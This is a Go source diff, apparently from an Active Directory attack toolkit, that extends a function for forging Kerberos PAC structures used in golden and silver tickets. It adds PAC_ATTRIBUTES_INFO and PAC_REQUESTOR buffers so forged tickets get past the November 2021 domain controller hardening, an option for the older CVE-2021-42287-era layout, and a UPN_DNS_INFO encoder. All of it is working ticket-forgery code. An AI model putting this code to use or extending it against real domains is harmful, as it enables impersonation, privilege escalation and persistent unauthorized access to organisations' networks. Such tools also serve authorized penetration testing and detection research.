@@ -230,12 +230,33 @@ func SignatureTypeForEType(etype int) (sigType uint32, size int, ok bool) {
 	}
 }
 
+// ForgeExtras selects the optional buffers Forge adds beyond the logon and
+// client info.
+type ForgeExtras struct {
+	// OldPAC omits PAC_ATTRIBUTES_INFO and PAC_REQUESTOR, producing the PAC
+	// layout from before the November 2021 hardening (CVE-2021-42287).
+	OldPAC bool
+	// UPNDNS, when set, adds a UPN_DNS_INFO buffer with the SAM name and SID
+	// extension.
+	UPNDNS *UPNDNSInfo
+}
+
 // Forge assembles an unsigned PAC from an NDR-encoded logon info and the client
 // principal, with empty server (0x06) and KDC (0x07) signature buffers sized for
 // signEType. Call Sign(serverKey, kdcKey) on the result to fill the signatures
 // and obtain the final marshaled PAC. For a golden ticket both keys are the
 // krbtgt key; for a silver ticket both are the service account key.
+//
+// The PAC carries PAC_ATTRIBUTES_INFO and PAC_REQUESTOR, which DCs enforcing the
+// November 2021 PAC hardening require: without them Windows Server 2025 refuses
+// the TGT with KDC_ERR_TGT_REVOKED. ForgeWithExtras can omit them or add
+// UPN_DNS_INFO.
 func Forge(info *KERB_VALIDATION_INFO, clientName string, clientAuthTime time.Time, signEType int) (*PAC, error) {
+	return ForgeWithExtras(info, clientName, clientAuthTime, signEType, ForgeExtras{})
+}
+
+// ForgeWithExtras is Forge with control over the optional buffers.
+func ForgeWithExtras(info *KERB_VALIDATION_INFO, clientName string, clientAuthTime time.Time, signEType int, extras ForgeExtras) (*PAC, error) {
 	sigType, sigSize, ok := SignatureTypeForEType(signEType)
 	if !ok {
 		return nil, fmt.Errorf("pac: cannot forge PAC signatures for etype %d", signEType)
@@ -246,13 +267,124 @@ func Forge(info *KERB_VALIDATION_INFO, clientName string, clientAuthTime time.Ti
 	}
 	clientInfo := MarshalClientInfo(clientAuthTime, clientName)
 
-	p := &PAC{Buffers: []Buffer{
+	buffers := []Buffer{
 		{Type: BufferLogonInfo, Data: logonInfo},
 		{Type: BufferClientInfo, Data: clientInfo},
-		{Type: BufferServerChecksum, Data: newSignatureBuffer(sigType, sigSize)},
-		{Type: BufferKDCChecksum, Data: newSignatureBuffer(sigType, sigSize)},
-	}}
-	return p, nil
+	}
+	if extras.UPNDNS != nil {
+		upnDNS, err := MarshalUPNDNSInfo(*extras.UPNDNS)
+		if err != nil {
+			return nil, err
+		}
+		buffers = append(buffers, Buffer{Type: BufferUPNDNSInfo, Data: upnDNS})
+	}
+	if !extras.OldPAC {
+		userSID := rpcSIDWithRID(info.LogonDomainId, info.UserId)
+		if userSID == nil {
+			return nil, fmt.Errorf("pac: PAC_REQUESTOR needs the logon info's LogonDomainId")
+		}
+		requestor, err := userSID.Marshal()
+		if err != nil {
+			return nil, err
+		}
+		buffers = append(buffers,
+			Buffer{Type: BufferAttributesInfo, Data: MarshalAttributesInfo(PACWasRequested)},
+			Buffer{Type: BufferRequestorSID, Data: requestor},
+		)
+	}
+	buffers = append(buffers,
+		Buffer{Type: BufferServerChecksum, Data: newSignatureBuffer(sigType, sigSize)},
+		Buffer{Type: BufferKDCChecksum, Data: newSignatureBuffer(sigType, sigSize)},
+	)
+	return &PAC{Buffers: buffers}, nil
+}
+
+// PAC_ATTRIBUTES_INFO flags ([MS-PAC] 2.14).
+const (
+	// PACWasRequested: the client asked for the PAC (or did not ask not to).
+	PACWasRequested uint32 = 0x00000001
+	// PACWasGivenImplicitly: the PAC was included without the client asking.
+	PACWasGivenImplicitly uint32 = 0x00000002
+)
+
+// MarshalAttributesInfo encodes a PAC_ATTRIBUTES_INFO buffer ([MS-PAC] 2.14):
+// FlagsLength (in bits, 2) followed by the flags.
+func MarshalAttributesInfo(flags uint32) []byte {
+	b := make([]byte, 8)
+	binary.LittleEndian.PutUint32(b[0:4], 2)
+	binary.LittleEndian.PutUint32(b[4:8], flags)
+	return b
+}
+
+// UPNDNSInfo is the content of a UPN_DNS_INFO buffer ([MS-PAC] 2.10) with the
+// SAM name and SID extension (flag S).
+type UPNDNSInfo struct {
+	UPN           string
+	DNSDomainName string
+	SamName       string
+	SID           *msdtyp.RPC_SID
+}
+
+// upnDNSFlagExtended is UPN_DNS_INFO flag S: the SAM name and SID follow.
+const upnDNSFlagExtended uint32 = 0x00000002
+
+// MarshalUPNDNSInfo encodes a UPN_DNS_INFO buffer with the SAM name and SID
+// extension: the fixed part (UpnLength/Offset, DnsDomainNameLength/Offset,
+// Flags, SamNameLength/Offset, SidLength/Offset) followed by the UTF-16LE
+// strings and the packed SID, each starting 8-byte aligned from the buffer's
+// start, as Windows and impacket lay them out.
+func MarshalUPNDNSInfo(u UPNDNSInfo) ([]byte, error) {
+	if u.SID == nil {
+		return nil, fmt.Errorf("pac: UPN_DNS_INFO needs the account SID")
+	}
+	sid, err := u.SID.Marshal()
+	if err != nil {
+		return nil, err
+	}
+	fields := [][]byte{
+		encodeUTF16LE(u.UPN),
+		encodeUTF16LE(u.DNSDomainName),
+		encodeUTF16LE(u.SamName),
+		sid,
+	}
+	const fixed = 20
+	// Every length and offset is a 16-bit field, so the strings and the SID,
+	// and the offsets they sit at, must fit. Real principal names never
+	// approach this, but a guard keeps a malformed one from truncating.
+	total := align8(fixed)
+	for _, f := range fields {
+		if len(f) > 0xFFFF || total > 0xFFFF {
+			return nil, fmt.Errorf("pac: UPN_DNS_INFO field or offset exceeds 16 bits")
+		}
+		total = align8(total + len(f))
+	}
+	out := make([]byte, align8(fixed))
+	offsets := make([]int, len(fields))
+	for i, f := range fields {
+		offsets[i] = len(out)
+		out = append(out, f...)
+		out = append(out, make([]byte, align8(len(out))-len(out))...)
+	}
+	binary.LittleEndian.PutUint16(out[0:2], uint16(len(fields[0])))
+	binary.LittleEndian.PutUint16(out[2:4], uint16(offsets[0]))
+	binary.LittleEndian.PutUint16(out[4:6], uint16(len(fields[1])))
+	binary.LittleEndian.PutUint16(out[6:8], uint16(offsets[1]))
+	binary.LittleEndian.PutUint32(out[8:12], upnDNSFlagExtended)
+	binary.LittleEndian.PutUint16(out[12:14], uint16(len(fields[2])))
+	binary.LittleEndian.PutUint16(out[14:16], uint16(offsets[2]))
+	binary.LittleEndian.PutUint16(out[16:18], uint16(len(fields[3])))
+	binary.LittleEndian.PutUint16(out[18:20], uint16(offsets[3]))
+	return out, nil
+}
+
+// encodeUTF16LE encodes s as UTF-16LE bytes.
+func encodeUTF16LE(s string) []byte {
+	units := utf16Units(s)
+	b := make([]byte, 2*len(units))
+	for i, u := range units {
+		binary.LittleEndian.PutUint16(b[2*i:], u)
+	}
+	return b
 }
 
 // newSignatureBuffer builds a PAC_SIGNATURE_DATA buffer ([MS-PAC] 2.8): a 4-byte
